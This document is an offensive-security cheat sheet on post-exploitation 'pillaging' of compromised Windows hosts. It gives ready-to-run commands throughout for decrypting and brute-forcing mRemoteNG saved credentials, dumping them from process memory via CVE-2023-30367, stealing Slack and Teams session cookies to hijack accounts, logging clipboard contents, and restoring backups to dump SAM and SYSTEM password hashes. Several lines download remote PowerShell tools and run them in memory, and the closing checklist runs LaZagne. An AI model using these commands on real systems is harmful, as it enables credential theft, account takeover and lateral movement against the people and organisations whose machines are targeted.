## Pillaging

Pillaging is structured post-exploitation intelligence gathering. Every application, service, and credential found on a compromised host is a potential pivot point. The goal is to build a complete picture of what the machine touches so you can move laterally or escalate privileges further. 

***

## Installed Application Enumeration

```cmd
:: Quick visual survey of installed apps
dir "C:\Program Files"
dir "C:\Program Files (x86)"
```

```powershell
# Full registry-backed enumeration with version info (covers both 32-bit and 64-bit apps)
$INSTALLED  = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
              Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
              Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | Where-Object {$_.DisplayName} | Sort-Object DisplayName -Unique | Format-Table -AutoSize

# What to watch for in the output:
# mRemoteNG, RoyalTS, mRemote   -> saved remote connection credentials
# KeePass                       -> credential database
# TeamViewer, AnyDesk           -> remote access tool credentials
# WinSCP, FileZilla             -> FTP/SFTP saved sessions
# Slack, Teams desktop client   -> IM session cookies
# Backup agents (Veeam, Acronis, restic) -> backup repo credentials + data access
# Database clients (SSMS, DBeaver)       -> saved DB connection strings
```

***

## mRemoteNG Credential Extraction

mRemoteNG uses a hardcoded default master password (`mR3m`) to encrypt credentials in its config file. If the user did not set a custom password, the file is trivially decryptable. 

### Locating and Reading confCons.xml

```powershell
# Default config file location
ls "$env:APPDATA\mRemoteNG"
# Files: confCons.xml, mRemoteNG.log

# Read the XML
type "$env:APPDATA\mRemoteNG\confCons.xml"

# Or search all user profiles
Get-ChildItem "C:\Users\*\AppData\Roaming\mRemoteNG\confCons.xml" -ErrorAction SilentlyContinue

# The fields to extract from each <Node> element:
# Username=       -> plaintext
# Domain=         -> plaintext
# Hostname=       -> plaintext
# Protocol=       -> RDP/SSH/VNC
# Password=       -> AES-GCM encrypted, base64 encoded
# Protected=      -> master password verification hash
```

### Decryption - No Custom Password (Default mR3m)

```bash
# Using mremoteng_decrypt.py
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+..."
# Output: Password: ASDki230kasd09fk233aDA

# Or pass the entire config file (-rf flag)
python3 mremoteng_decrypt.py -rf confCons.xml
```

### Decryption - Custom Master Password (Brute Force)

```bash
# If custom password set, attempt to brute force using a wordlist
for password in $(cat /usr/share/wordlists/fasttrack.txt); do
    result=$(python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/..." -p "$password" 2>/dev/null)
    if [[ $result == *"Password:"* ]]; then
        echo "[+] FOUND: $password"
        echo "$result"
        break
    fi
done

# Using rockyou instead
for password in $(cat /usr/share/wordlists/rockyou.txt); do
    python3 mremoteng_decrypt.py -s "<base64_hash>" -p "$password" 2>/dev/null | grep -v "^$" && echo "[$password]"
done

# Validate against Protected= attribute:
# Result "Password: ThisIsProtected" = correct master password found
# Result "Password: <actual_pass>"   = cracked individual credential
```

### CVE-2023-30367 - Memory Dump Attack

mRemoteNG decrypts all config credentials into memory at startup, even without an active connection. 

```bash
# Use CVE-2023-30367 dumper if mRemoteNG is running
git clone https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper
.\CVE-2023-30367.exe    # dumps decrypted config from mRemoteNG process memory

# Metasploit post module
msf6 > use post/windows/gather/credentials/mremote
msf6 > set SESSION 1
msf6 > run
```

***

## Browser Cookie Extraction for IM Client Access

Slack, Teams, and other web-based IM clients use a session cookie to authenticate. Stealing it lets you access the full message history and files shared in channels. 

### Firefox Cookies (SQLite - No Encryption)

```powershell
# Copy Firefox cookie database (locked while Firefox is open, copy first)
copy "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite" C:\Windows\Temp\

# Also grab session storage (may contain auth tokens)
copy "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\webappsstore.sqlite" C:\Windows\Temp\
```

```bash
# Extract Slack 'd' cookie on attack machine
python3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d

# Or raw sqlite3 query
sqlite3 cookies.sqlite "SELECT host, name, value FROM moz_cookies WHERE host LIKE '%slack%';"
sqlite3 cookies.sqlite "SELECT host, name, value FROM moz_cookies WHERE host LIKE '%teams%';"
```

### Chrome/Edge Cookies (DPAPI-Encrypted - Requires Running as User)

```powershell
# Chrome moved cookies to Network subfolder in recent versions - fix the path for SharpChromium
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" `
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"

# Load and run SharpChromium in-memory
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
Invoke-SharpChromium -Command "cookies slack.com"
Invoke-SharpChromium -Command "cookies teams.microsoft.com"
Invoke-SharpChromium -Command "logins"     # saved username/passwords
```

### Using Extracted Cookie in Browser

```
1. Open target website (slack.com, teams.microsoft.com)
2. Install Cookie-Editor browser extension
3. Click extension icon on the target domain
4. Find cookie named 'd' (Slack) or similar auth token
5. Replace value with extracted value
6. Save -> refresh page -> authenticated as target user
```

***

## Clipboard Monitoring

Administrators copy-paste passwords from password managers into login forms. Clipboard monitoring captures these without keylogging: 

```powershell
# In-memory clipboard logger
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
# Runs in a loop, prints anything placed on clipboard in real time

# Manual one-shot clipboard read (single capture, no loop)
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Clipboard]::GetText()

# Persistent clipboard logger that writes to a file
while ($true) {
    $clip = Get-Clipboard -Raw
    if ($clip) {
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        "$timestamp | $clip" | Out-File C:\Windows\Temp\clip.log -Append
    }
    Start-Sleep 3
}
```

***

## Attacking Backup Systems

Backup agents almost universally require local admin on every target machine, meaning the backup service account is an extremely high-value credential. The backup data itself also contains copies of every sensitive file from every host it protects. 

### restic - Credential and Data Recovery

```powershell
# Check if restic or similar backup tool is present
where restic
Get-ChildItem "C:\Program Files\*" -Recurse -Filter "restic.exe" -ErrorAction SilentlyContinue

# Check environment for pre-configured repo credentials
echo $env:RESTIC_PASSWORD
echo $env:RESTIC_REPOSITORY

# List existing snapshots in a known repo
restic.exe -r E:\restic2\ snapshots
restic.exe -r \\BACKUPSRV\backups snapshots

# Restore a snapshot containing SAM/SYSTEM hives
restic.exe -r E:\restic2\ restore <snapshot_id> --target C:\Windows\Temp\restore

# Access restored SAM hive directly
impacket-secretsdump -sam C:\Windows\Temp\restore\C\Windows\System32\config\SAM `
                     -system C:\Windows\Temp\restore\C\Windows\System32\config\SYSTEM local
```

### Backup a Protected Directory Using VSS

```powershell
# Use VSS snapshot flag to bypass file locks on active system files
$env:RESTIC_PASSWORD = 'Password'

# Backup SAM/SYSTEM via VSS (requires admin)
restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

# Backup entire C drive
restic.exe -r E:\restic2\ backup C:\ --use-fs-snapshot

# Restore and dump hashes
restic.exe -r E:\restic2\ restore <ID> --target C:\Windows\Temp\extracted
impacket-secretsdump -sam C:\Windows\Temp\extracted\C\Windows\System32\config\SAM \
                     -system C:\Windows\Temp\extracted\C\Windows\System32\config\SYSTEM local
```

### What to Look For in Restored Backups

```
Windows backup targets:
  C:\Windows\System32\config\SAM     -> local account NTLM hashes
  C:\Windows\System32\config\SYSTEM  -> boot key for SAM decryption
  C:\Windows\NTDS\ntds.dit           -> Active Directory database (all domain hashes)
  C:\inetpub\wwwroot\web.config      -> IIS database connection strings
  C:\Users\*\.ssh\                   -> SSH private keys
  C:\Users\*\AppData\Roaming\mRemoteNG\confCons.xml -> connection manager creds

Linux backup targets:
  /etc/shadow                        -> user password hashes
  /etc/passwd                        -> user account list
  /root/.ssh/id_rsa                  -> root SSH private key
  /home/*/.ssh/                      -> user SSH keys
  /var/www/html/config.*             -> web app DB credentials
  /opt/*/conf/ or /etc/*/config      -> service credentials
```

***

## Pillaging Priority Checklist

```powershell
# Run this sweep after gaining access

# 1. Enumerate installed apps for high-value targets
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName,DisplayVersion | Where-Object {$_.DisplayName} | Sort-Object DisplayName

# 2. mRemoteNG config
Get-ChildItem "C:\Users\*\AppData\Roaming\mRemoteNG\confCons.xml" -ErrorAction SilentlyContinue

# 3. Browser cookies
copy "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite" C:\Windows\Temp\
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" C:\Windows\Temp\ChromeCookies

# 4. Clipboard
[System.Windows.Forms.Clipboard]::GetText()

# 5. Check for backup tools and existing repos
where restic; where veeam; where robocopy
echo $env:RESTIC_PASSWORD
echo $env:RESTIC_REPOSITORY

# 6. Process command line sweep for credentials
Get-WmiObject Win32_Process | Select-Object CommandLine |
    Where-Object {$_.CommandLine -match "password|passwd|/p:|/pass"} |
    Format-List

# 7. LaZagne catch-all
.\lazagne.exe all
```
